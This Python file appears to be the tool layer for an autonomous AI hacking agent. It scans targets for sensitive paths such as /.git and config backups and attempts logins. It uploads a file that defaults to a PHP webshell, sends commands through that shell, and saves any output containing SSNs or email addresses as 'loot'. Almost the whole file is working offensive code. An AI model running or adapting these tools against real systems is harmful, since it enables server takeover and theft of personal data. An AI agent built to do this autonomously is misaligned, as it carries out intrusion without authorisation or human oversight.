import requests
from typing import Any

class ToolExecutor:
    def __init__(self):
        self.session = requests.Session()
        self.common_paths = [
            "/admin", "/login", "/backup", "/config", "/uploads",
            "/.git", "/api", "/debug", "/test", "/old",
            "/backup/config.php.bak", "/admin/upload"
        ]
    
    def get_tool_descriptions(self) -> str:
        from prompts import TOOL_DESCRIPTIONS
        return TOOL_DESCRIPTIONS
    
    def execute(self, tool_name: str, params: dict, state: Any) -> str:
        """Execute a tool and return results."""
        try:
            method = getattr(self, f"tool_{tool_name}", None)
            if method:
                return method(params, state)
            return f"Unknown tool: {tool_name}"
        except Exception as e:
            return f"Tool error: {str(e)}"
    
    def tool_http_request(self, params: dict, state: Any) -> str:
        """Make HTTP request."""
        url = params.get("url", state.target_url)
        method = params.get("method", "GET").upper()
        data = params.get("data")
        cookies = params.get("cookies") or state.session_cookies
        
        try:
            if method == "GET":
                resp = self.session.get(url, cookies=cookies, timeout=10)
            elif method == "POST":
                resp = self.session.post(url, data=data, cookies=cookies, timeout=10)
            else:
                resp = self.session.request(method, url, data=data, cookies=cookies, timeout=10)
            
            # Truncate long responses
            body = resp.text[:2000] if len(resp.text) > 2000 else resp.text
            
            return f"Status: {resp.status_code}\nHeaders: {dict(resp.headers)}\n\nBody:\n{body}"
        except Exception as e:
            return f"Request failed: {str(e)}"
    
    def tool_scan_paths(self, params: dict, state: Any) -> str:
        """Scan for common paths with concurrent requests for SPEED."""
        from concurrent.futures import ThreadPoolExecutor, as_completed

        base_url = params.get("base_url", state.target_url).rstrip("/")
        found = []

        def check_path(path):
            try:
                url = f"{base_url}{path}"
                # Short timeout for speed - fail fast
                resp = self.session.get(url, timeout=2)
                if resp.status_code == 200:
                    return f"{path} (200 OK, {len(resp.text)} bytes)"
                elif resp.status_code in [301, 302, 403]:
                    return f"{path} ({resp.status_code})"
            except:
                pass
            return None

        # Scan all paths concurrently
        with ThreadPoolExecutor(max_workers=6) as executor:
            futures = {executor.submit(check_path, path): path for path in self.common_paths}
            for future in as_completed(futures, timeout=10):  # Overall timeout
                try:
                    result = future.result()
                    if result:
                        found.append(result)
                except:
                    pass

        if found:
            return f"Path scan complete. Found {len(found)} accessible paths:\n" + "\n".join(found)
        return "Path scan complete. No interesting paths found."
    
    def tool_read_file(self, params: dict, state: Any) -> str:
        """Read file from URL."""
        url = params.get("url")
        if not url:
            return "Error: url parameter required"
        
        try:
            resp = self.session.get(url, timeout=10)
            if resp.status_code == 200:
                content = resp.text[:3000]  # Limit size
                return f"File contents ({len(resp.text)} bytes):\n\n{content}"
            return f"Failed to read file: HTTP {resp.status_code}"
        except Exception as e:
            return f"Failed to read file: {str(e)}"
    
    def tool_try_login(self, params: dict, state: Any) -> str:
        """Attempt login."""
        url = params.get("url")
        username = params.get("username")
        password = params.get("password")
        
        if not all([url, username, password]):
            return "Error: url, username, and password required"
        
        try:
            resp = self.session.post(
                url,
                data={"username": username, "password": password},
                allow_redirects=True,
                timeout=10
            )
            
            # Check for successful login indicators
            if "admin" in resp.url.lower() or "dashboard" in resp.text.lower() or "welcome" in resp.text.lower():
                # Save session cookies to state
                state.session_cookies = dict(self.session.cookies)
                return f"LOGIN SUCCESSFUL! Logged in as {username}. Session established. Redirected to: {resp.url}"
            
            if "invalid" in resp.text.lower() or "error" in resp.text.lower():
                return f"Login failed: Invalid credentials for {username}:{password}"
            
            return f"Login attempt completed. Status: {resp.status_code}. Response indicates: uncertain result"
        except Exception as e:
            return f"Login attempt failed: {str(e)}"
    
    def tool_upload_file(self, params: dict, state: Any) -> str:
        """Upload file to target."""
        url = params.get("url")
        filename = params.get("filename", "shell.php")
        content = params.get("content", "<?php system($_GET['cmd']); ?>")
    
        if not url:
            return "Error: url parameter required"
    
        # Fix truncated URL
        if not url.startswith("http"):
            url = f"{state.target_url}/admin/upload"
        elif url.endswith("/u"):
            url = url.replace("/u", "/upload")
    
        try:
            files = {"file": (filename, content)}
            resp = self.session.post(url, files=files, timeout=10)
        
            upload_path = f"/uploads/{filename}"
        
            if resp.status_code == 200:
                state.footholds.append(f"webshell:{upload_path}")
                return f"FILE UPLOADED SUCCESSFULLY!\nFilename: {filename}\nAccessible at: {state.target_url.rstrip('/')}{upload_path}\nYou can now execute commands via this webshell."
        
            return f"Upload failed. Status: {resp.status_code}. Response: {resp.text[:500]}"
        except Exception as e:
            return f"Upload failed: {str(e)}"
        
      
    
    def tool_execute_command(self, params: dict, state: Any) -> str:
        """Execute command via webshell."""
        shell_url = params.get("shell_url")
        cmd = params.get("cmd")
        
        if not shell_url or not cmd:
            return "Error: shell_url and cmd parameters required"
        
        try:
            # Add cmd parameter to URL
            if "?" in shell_url:
                full_url = f"{shell_url}&cmd={cmd}"
            else:
                full_url = f"{shell_url}?cmd={cmd}"
            
            resp = self.session.get(full_url, timeout=10)
            
            if resp.status_code == 200:
                output = resp.text.strip()
                if output:
                    # Check if we got sensitive data
                    if "ssn" in output.lower() or "@" in output:
                        state.loot.append(output[:500])
                        return f"COMMAND EXECUTED: {cmd}\n\nOUTPUT:\n{output}\n\n⚠️ SENSITIVE DATA DETECTED - Added to loot!"
                    return f"COMMAND EXECUTED: {cmd}\n\nOUTPUT:\n{output}"
                return f"Command executed but no output returned"
            
            return f"Command execution failed: HTTP {resp.status_code}"
        except Exception as e:
            return f"Command execution failed: {str(e)}"
